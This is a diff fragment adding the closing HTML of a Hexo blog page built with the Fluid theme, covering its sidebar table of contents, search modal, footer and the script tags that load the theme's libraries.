+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
